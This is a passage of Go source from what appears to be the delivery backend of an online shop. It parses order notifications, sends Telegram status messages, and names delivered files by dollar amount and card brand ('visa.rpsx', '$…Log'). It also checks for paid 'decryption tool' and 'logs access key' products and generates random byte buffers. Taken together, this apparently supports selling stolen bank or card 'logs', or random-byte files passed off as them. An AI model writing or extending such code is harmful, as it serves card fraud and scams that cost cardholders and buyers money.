			filename = fmt.Sprintf("%s%sLog.lsky", amount, productType)
		}
		log.Printf("Generated Kuiper filename with dollar amount: %s", filename)
		return filename
	}

	// Handle other products
	// Default case: just use the product name without spaces
	cleanName := strings.Replace(productName, " ", "", -1)

	// Check if cleanName already ends with "log" to avoid duplication
	var filename string
	cleanNameLower := strings.ToLower(cleanName)
	if strings.HasSuffix(cleanNameLower, "log") {
		filename = fmt.Sprintf("%s.lsky", cleanName)
	} else {
		filename = fmt.Sprintf("%sLog.lsky", cleanName)
	}
	log.Printf("Generated generic Kuiper filename: %s", filename)
	return filename
}

// ParseNotification parses the notification message to extract details for delivery
func ParseNotification(notificationText string) (email, name, product string, err error) {
	log.Printf("Parsing notification: %s", notificationText)

	// Extract email using string operations to avoid regex issues
	emailStart := strings.Index(notificationText, "**Email:** `")
	if emailStart == -1 {
		return "", "", "", fmt.Errorf("email not found in notification")
	}
	emailStart += 12 // Length of "**Email:** `"
	emailEnd := strings.Index(notificationText[emailStart:], "`")
	if emailEnd == -1 {
		return "", "", "", fmt.Errorf("email format invalid in notification")
	}
	email = notificationText[emailStart : emailStart+emailEnd]

	// Extract name using string operations
	nameStart := strings.Index(notificationText, "**Name:** `")
	if nameStart == -1 {
		log.Printf("Name not found in notification, using 'Customer' as default")
		return email, "Customer", "", nil
	}
	nameStart += 11 // Length of "**Name:** `"
	nameEnd := strings.Index(notificationText[nameStart:], "`")
	if nameEnd == -1 {
		return email, "Customer", "", fmt.Errorf("name format invalid in notification")
	}
	name = notificationText[nameStart : nameStart+nameEnd]

	// Extract product using string operations
	productStart := strings.Index(notificationText, "**Product:** `")
	if productStart == -1 {
		return email, name, "", fmt.Errorf("product not found in notification")
	}
	productStart += 14 // Length of "**Product:** `"
	productEnd := strings.Index(notificationText[productStart:], "`")
	if productEnd == -1 {
		return email, name, "", fmt.Errorf("product format invalid in notification")
	}
	product = notificationText[productStart : productStart+productEnd]

	log.Printf("Parsed notification - Email: %s, Name: %s, Product: %s", email, name, product)
	return email, name, product, nil
}

// BuildProductPayloadForBot formats the notification for the Telegram bot
func BuildProductPayloadForBot(email, name, product, notificationType, site string) string {
	var message bytes.Buffer
	currentTime := time.Now().Format("2006-01-02 15:04:05")

	if notificationType == "delivery" {
		message.WriteString("✅ *Product Delivered*\n\n")
		message.WriteString(fmt.Sprintf("*Email:* `%s`\n", email))
		message.WriteString(fmt.Sprintf("*Product:* `%s`\n", product))
		message.WriteString(fmt.Sprintf("*Site:* `%s`\n", site))
		message.WriteString(fmt.Sprintf("*Status:* `Delivered`\n"))
		message.WriteString(fmt.Sprintf("*Time:* `%s`\n", currentTime))
	} else {
		message.WriteString("⚠️ *Delivery Failed*\n\n")
		message.WriteString(fmt.Sprintf("*Email:* `%s`\n", email))
		message.WriteString(fmt.Sprintf("*Product:* `%s`\n", product))
		message.WriteString(fmt.Sprintf("*Site:* `%s`\n", site))
		message.WriteString(fmt.Sprintf("*Status:* `Failed`\n"))
		message.WriteString(fmt.Sprintf("*Time:* `%s`\n", currentTime))
	}

	return message.String()
}

// CheckIfRPSXTool checks if the product is the RPSX decryption tool
func CheckIfRPSXTool(productName string) bool {
	productNameLower := strings.ToLower(productName)
	return strings.Contains(productNameLower, "rpsx decryption tool") ||
		strings.Contains(productNameLower, "rpsx tool") ||
		strings.Contains(productNameLower, "decryption tool")
}

// CheckIfKuiperTool checks if the product is the Kuiper decryption tool
func CheckIfKuiperTool(productName string) bool {
	productNameLower := strings.ToLower(productName)
	return strings.Contains(productNameLower, "kuiper decryption tool") ||
		strings.Contains(productNameLower, "kuiper tool") ||
		strings.Contains(productNameLower, "lsky decryption tool") ||
		strings.Contains(productNameLower, "lsky tool") ||
		strings.Contains(productNameLower, "kuiper logs access key") ||
		strings.Contains(productNameLower, "logs access key") ||
		strings.Contains(productNameLower, "lsakey") ||
		productNameLower == "lsakey"
}

// GenerateRandomBytes generates a random byte slice of size between min and max
func GenerateRandomBytes(min, max int64) ([]byte, error) {
	// Generate random size between min and max
	diff := max - min
	n, err := rand.Int(rand.Reader, big.NewInt(diff))
	if err != nil {
		return nil, err
	}
	size := n.Int64() + min

	// Create buffer and fill with random data
	buf := make([]byte, size)
	_, err = rand.Read(buf)
	if err != nil {
		return nil, err
	}

	return buf, nil
}

// GenerateProductFilename creates the appropriate filename based on product name
func GenerateProductFilename(productName string) string {
	log.Printf("Generating filename for product: %s", productName)

	// Check if this is the RPSX tool (should not happen here, but just in case)
	if CheckIfRPSXTool(productName) {
		return "RPSX_Decryption_Tool.txt"
	}

	// Check special cases for Visa and Mastercard
	productLower := strings.ToLower(productName)
	if strings.Contains(productLower, "visa") {
		return "visa.rpsx"
	}
	if strings.Contains(productLower, "mastercard") {
		return "mastercard.rpsx"
	}

	// Look for dollar amount using a simple string search
	dollarIndex := strings.Index(productName, "$")
	if dollarIndex != -1 {
		// Find the end of the dollar amount (first space after $ or end of string)
		amountEnd := strings.Index(productName[dollarIndex:], " ")
		if amountEnd == -1 {
			// No space, use the rest of the string
			amountEnd = len(productName) - dollarIndex
		} else {
			amountEnd += dollarIndex
		}

		// Extract the amount and the product type
		amount := productName[dollarIndex:amountEnd]
		productType := ""
		if amountEnd < len(productName) {
			productType = strings.TrimSpace(productName[amountEnd:])
		}

		// Remove spaces and format the filename
		productType = strings.Replace(productType, " ", "", -1)

		// Check if productType already ends with "log" to avoid duplication
		var filename string
		productTypeLower := strings.ToLower(productType)
		if strings.HasSuffix(productTypeLower, "log") {
			filename = fmt.Sprintf("%s%s.rpsx", amount, productType)
		} else {
			filename = fmt.Sprintf("%s%sLog.rpsx", amount, productType)
		}
		log.Printf("Generated filename with dollar amount: %s", filename)
		return filename
	}

	// Handle other products
	// Default case: just use the product name without spaces
	cleanName := strings.Replace(productName, " ", "", -1)

	// Check if cleanName already ends with "log" to avoid duplication
	var filename string
	cleanNameLower := strings.ToLower(cleanName)
	if strings.HasSuffix(cleanNameLower, "log") {
		filename = fmt.Sprintf("%s.rpsx", cleanName)
	} else {
		filename = fmt.Sprintf("%sLog.rpsx", cleanName)
	}
	log.Printf("Generated generic filename: %s", filename)
	return filename
}
